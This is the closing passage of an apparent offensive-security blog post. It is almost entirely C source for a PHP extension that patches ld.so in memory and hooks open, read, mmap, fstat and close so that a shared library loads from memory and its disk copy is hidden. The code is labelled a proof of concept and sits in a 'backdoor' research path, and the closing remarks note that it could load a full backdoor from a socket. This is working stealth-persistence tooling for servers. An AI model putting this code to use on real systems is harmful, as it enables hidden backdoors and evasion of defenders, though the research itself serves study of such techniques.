const size_t pattern_lengths[] = {read_pattern_length, mmap_pattern_length, pread64_pattern_length, 
                                  fxstat_pattern_length, close_pattern_length, open_pattern_length, 0};
const char* symbols[] = {"read", "mmap", "pread", "fstat", "close", "open", NULL};
uint64_t functions[] = {(uint64_t)&my_read, (uint64_t)&my_mmap, (uint64_t)&my_pread64, (uint64_t)&my_fstat, 
                        (uint64_t)&my_close, (uint64_t)&my_open, 0}; 
char *fixes[7] = {0};

uint64_t fix_locations[7] = {0};
size_t page_size;
uint64_t first = 0;

bool find_ld_in_memory(uint64_t *addr1, uint64_t *addr2) {
    FILE* f = NULL;
    char  buffer[1024] = {0};
    char* tmp = NULL;
    char* start = NULL;
    char* end = NULL;
    bool  found = false;

    if ((f = fopen("/proc/self/maps", "r")) == NULL){
        return found;
    }

    while ( fgets(buffer, sizeof(buffer), f) ){
        if ( strstr(buffer, "r-xp") == 0 ) {
            continue;
        }
        if ( strstr(buffer, "ld-linux-x86-64.so.2") == 0 ) {
            continue;        
        }

        buffer[strlen(buffer)-1] = 0;
        tmp = strrchr(buffer, ' ');
        if ( tmp == NULL || tmp[0] != ' ')
            continue;
        ++tmp;

        start = strtok(buffer, "-");
        *addr1 = strtoul(start, NULL, 16);
        end = strtok(NULL, " ");
        *addr2 = strtoul(end, NULL, 16);
        found = true;
    }
    fclose(f);
    return found;
}


/* hooks */

int my_open(const char *pathname, int flags) {
    void *handle;
    int (*mylegacyopen)(const char *pathnam, int flags);

    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyopen = dlsym(handle, "open");
    if (strstr(pathname, "magic.so") != 0){
        printf("\t[+] Open called with magic word. Returning magic FD (0x69)\n");
        return 0x69;
    }
    return mylegacyopen(pathname, flags);
}

ssize_t my_read(int fd, void *buf, size_t count){
    void *handle;
    ssize_t (*mylegacyread)(int fd, void *buf, size_t count);

    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyread = dlsym(handle, "read");
    if (fd == 0x69){
        size_t size = 0;
        if ( libdata.size - libdata.current >= count ) {
            size = count;
        } else {
            size = libdata.size - libdata.current;
        }
        memcpy(buf, libdata.data + libdata.current, size);
        libdata.current += size;
        printf("\t[+] Read called with magic FD. Returning %ld bytes from memory\n", size);
        return size;
    }
    size_t ret =  mylegacyread(fd, buf, count);
    printf("Size: %ld\n",ret);
    return ret;
}

void * my_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset){
    int mflags = 0;
    void * ret = NULL;
    uint64_t start = 0;
    size_t size = 0;

    if ( fd == 0x69 ) {
        mflags = MAP_PRIVATE|MAP_ANON;
        if ( (flags & MAP_FIXED) != 0 ) {
            mflags |= MAP_FIXED;
        }
        ret = mmap(addr, length, PROT_READ|PROT_WRITE|PROT_EXEC, mflags, -1, 0);
        size = length > libdata.size - offset ? libdata.size - offset : length;
        memcpy(ret, libdata.data + offset, size);
        mprotect(ret, size, prot);
        if (first == 0){
            first = (uint64_t)ret;
        }
        printf("\t[+] Inside hooked mmap (fd: 0x%x)\n", fd);
        return ret;
    }
    return mmap(addr, length, prot, flags, fd, offset);
}


int my_fstat(int fd, struct stat *buf){
    void *handle;
    int (*mylegacyfstat)(int fd, struct stat *buf);


    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyfstat = dlsym(handle, "fstat64");

    if ( fd == 0x69 ) {
        memset(buf, 0, sizeof(struct stat));
        buf->st_size = libdata.size;
        buf->st_ino = 0x666; // random number
        printf("\t[+] Inside hooked fstat64 (fd: 0x%x)\n", fd);
        return 0;
    }
    return mylegacyfstat(fd, buf);
}

int my_close(int fd) {
    if (fd == 0x69){
        printf("\t[+] Inside hooked close (fd: 0x%x)\n", fd);
        return 0;
    }
    return close(fd);
}

ssize_t my_pread64(int fd, void *buf, size_t count, off_t offset) {
    void *handle;
    int (*mylegacypread)(int fd, void *buf, size_t count);

    handle = dlopen(LIBC, RTLD_NOW);
    mylegacypread = dlsym(handle, "pread");
    printf("\t[+] Inside pread64 (FD: %d)\n", fd);
    return mylegacypread(fd, buf, count);
}


/* Patch ld.so */
bool search_and_patch(uint64_t start_addr, uint64_t end_addr, const char* pattern, const size_t length, const char* symbol, const uint64_t replacement_addr, int position) {

    bool     found = false;
    int32_t  offset = 0;
    uint64_t tmp_addr = 0;
    uint64_t symbol_addr = 0;
    char * code = NULL;
    void * page_addr = NULL;

    tmp_addr = start_addr;
    while ( ! found && tmp_addr+length < end_addr) {
        if ( memcmp((void*)tmp_addr, (void*)pattern, length) == 0 ) {
            found = true;
            continue;
        }
        ++tmp_addr;
    }

    if ( ! found ) {
        return false;
    }

    offset = *((uint64_t*)(tmp_addr + length));
    symbol_addr = tmp_addr + length + 4 + offset;

    //Save data to fix later
    fixes[position] = malloc(stub_length * sizeof(char));
    memcpy(fixes[position], (void*)symbol_addr, stub_length);
    fix_locations[position] = symbol_addr;
    printf("[*] Symbol: %s - Addr: %lx\n", symbol, fix_locations[position]);

    code = malloc(stub_length * sizeof(char));
    memcpy(code, stub, stub_length);
    memcpy(code+6, &replacement_addr, sizeof(uint64_t));

    page_addr = (void*) (((size_t)symbol_addr) & (((size_t)-1) ^ (page_size - 1)));
    mprotect(page_addr, page_size, PROT_READ | PROT_WRITE); 
    memcpy((void*)symbol_addr, code, stub_length);
    mprotect(page_addr, page_size, PROT_READ | PROT_EXEC); 
    return true;
}

/* Read file from disk */
bool load_library_from_file(char * path, lib_t *libdata) {
    struct stat st;
    FILE * file;
    size_t read;

    if ( stat(path, &st) < 0 ) {
        return false;
    }

    libdata->size = st.st_size;
    libdata->data = malloc( st.st_size );
    libdata->current = 0;

    file = fopen(path, "r");

    read = fread(libdata->data, 1, st.st_size, file);
    fclose(file);

    return true;
}

/* remove hooks */
bool fix_hook(char *fix, uint64_t addr){
    void *page_addr = (void*) (((size_t)addr) & (((size_t)-1) ^ (page_size - 1)));
    mprotect(page_addr, page_size, PROT_READ | PROT_WRITE);
    memcpy((void *)addr, fix, stub_length);
    mprotect(page_addr, page_size, PROT_READ | PROT_EXEC);
    return true;
}

extern void restore(void){
    int i = 0;
    printf("---------------------------------------\n");
    printf("[*] Fixing hooks\n");
    while ( patterns[i] != NULL ) {
           if ( ! fix_hook(fixes[i], fix_locations[i]) ) {
               return;
           }
           ++i;
    }
    return;
}

void patch_all(void){
    uint64_t start = 0;
    uint64_t end = 0;
    size_t i = 0;
    
    page_size = sysconf(_SC_PAGESIZE);
    printf("\t\t-=[ Proof of Concept ]=-\n\n");

    if (!load_library_from_file("/home/vagrant/research/php/backdoor/adepts/adepts.so", &libdata)){
        return;
    }
    if (!find_ld_in_memory(&start, &end)){
        return;
    }
    printf("[*] ld.so found in range [0x%lx-0x%lx]\n", start, end);
    printf("-------------[ Patching  ]-------------\n");
    while ( patterns[i] != NULL ) {
        if ( ! search_and_patch(start, end, patterns[i], pattern_lengths[i], symbols[i], functions[i], i) ) {     
            return;
        } 
        ++i;
    }
    printf("---------------------------------------\n");
    return;
}


static void check(void) __attribute__((constructor));
void check(void){
    printf("~~~> Hello from adepts.o <~~~\n");
    return;
}

/* Functions to execute */
zend_result onLoad(int a, int b){
    printf("[^] Executing onLoad\n");
    void* handle = dlopen("/home/vagrant/research/php/backdoor/adepts/adepts.so", RTLD_LAZY);
    while (dlclose(handle) != -1){
        printf("[*] dlclose()\n");
    }
    return SUCCESS;
}
zend_result onRequest(void){
    php_printf("\n[/!\\] Adepts of 0xCC [/!\\]\n\n");
    return SUCCESS;
}


// Basic zend_module_entry
zend_module_entry adepts_module_entry = {
    STANDARD_MODULE_HEADER,
    "adepts",                   /* Extension name */
    NULL,                   /* zend_function_entry */
    NULL,                           /* PHP_MINIT - Module initialization */
    NULL,                           /* PHP_MSHUTDOWN - Module shutdown */
    NULL,           /* PHP_RINIT - Request initialization */
    NULL,                           /* PHP_RSHUTDOWN - Request shutdown */
    NULL,           /* PHP_MINFO - Module info */
    PHP_ADEPTS_VERSION,     /* Version */
    STANDARD_MODULE_PROPERTIES
};

//Function "get_module" that will be executed by PHP
__attribute__((visibility("default")))
extern zend_module_entry *get_module(void){
    patch_all();
    void *handler = dlopen("./magic.so", RTLD_LAZY); 
    restore();

    static Dl_info info;
    dladdr(&info, &info);
    uint64_t diffLoad = (uint64_t)&onLoad - (uint64_t)info.dli_fbase;
    uint64_t diffRequest = (uint64_t)&onRequest - (uint64_t)info.dli_fbase;
    uint64_t newLoad = first + diffLoad;
    uint64_t newRequest = first + diffRequest;

    uint64_t diffModule = (uint64_t)&adepts_module_entry - (uint64_t)info.dli_fbase;
    ((zend_module_entry *)(diffModule + first))->module_startup_func = (void *)newLoad;
    ((zend_module_entry *)(diffModule + first))->request_shutdown_func = (void *)newRequest;
    return (void *)(diffModule + first);
}



#ifdef COMPILE_DL_ADEPTS
# ifdef ZTS
ZEND_TSRMLS_CACHE_DEFINE()
# endif
ZEND_GET_MODULE(adepts)
#endif
```

# EoF

We hope you enjoyed this reading. This same technique leveraged by `memdlopen` can be used in different situations like, for example, loading a complex backdoor (a whole shared library vs a simple shellcode) from a socket avoiding the usage of `memfd_create`.

Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).


